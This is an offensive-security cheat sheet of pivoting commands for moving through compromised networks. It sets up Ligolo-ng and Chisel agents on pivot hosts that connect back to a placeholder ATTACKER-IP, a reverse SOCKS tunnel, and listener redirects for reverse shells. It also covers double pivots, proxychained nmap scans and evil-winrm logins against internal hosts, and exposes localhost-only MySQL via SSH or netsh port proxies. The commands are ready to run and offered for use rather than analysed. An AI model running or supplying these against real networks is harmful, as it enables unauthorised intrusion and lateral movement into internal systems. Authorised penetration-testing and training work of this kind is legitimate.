# Pivoting Chains

## Ligolo-ng Setup
```bash
# On attacker (proxy):
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# On pivot host (agent):
./agent -connect ATTACKER-IP:11601 -ignore-cert

# On attacker — add route to internal subnet:
sudo ip route add 10.10.10.0/24 dev ligolo
# In proxy console:
session         # Select the agent
start           # Start the tunnel

# For reverse shells through the tunnel (listener redirect):
listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 --tcp
```

## Chisel Reverse SOCKS
```bash
# On attacker (server):
./chisel server --reverse --port 8080

# On pivot host (client):
./chisel client ATTACKER-IP:8080 R:socks

# Use with proxychains (edit /etc/proxychains4.conf):
# socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 10.10.10.0/24 -p 445
proxychains evil-winrm -i 10.10.10.5 -u admin -p pass
```

## SSH Dynamic Port Forward → proxychains
```bash
# Dynamic SOCKS proxy:
ssh -D 9050 user@PIVOT-IP -N -f
# Edit /etc/proxychains4.conf:
# socks5 127.0.0.1 9050
proxychains nmap -sT -Pn INTERNAL-IP

# Local port forward (single port):
ssh -L 8888:INTERNAL-IP:80 user@PIVOT-IP -N -f
curl http://127.0.0.1:8888

# Remote port forward:
ssh -R 9999:127.0.0.1:445 user@ATTACKER-IP -N -f
```

## Double Pivot (Host A → Host B → Host C)
```bash
# Ligolo-ng double pivot:
# 1. Set up first tunnel (Attacker → Host A → Network B)
# 2. Upload second agent to Host B via tunnel
# 3. On Host B, connect agent back through listener:
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
# 4. Run agent on Host B: ./agent -connect HOST-A-IP:11601 -ignore-cert
# 5. Add second route: sudo ip route add 172.16.0.0/24 dev ligolo
# 6. Start second session

# SSH double pivot:
ssh -J user@PIVOT-A user@PIVOT-B -D 9050
proxychains nmap -sT -Pn NETWORK-C-HOST
```

## Port Forward for Restricted Services
```bash
# MySQL only listening on localhost of target:
# Chisel:
./chisel client ATTACKER-IP:8080 R:3306:127.0.0.1:3306
mysql -h 127.0.0.1 -u root -p

# SSH local forward:
ssh -L 3306:127.0.0.1:3306 user@TARGET -N -f
mysql -h 127.0.0.1 -u root -p

# Ligolo listener:
listener_add --addr 0.0.0.0:3306 --to 127.0.0.1:3306 --tcp

# netsh (Windows):
netsh interface portproxy add v4tov4 listenport=4444 listenaddress=0.0.0.0 connectport=3306 connectaddress=127.0.0.1
```
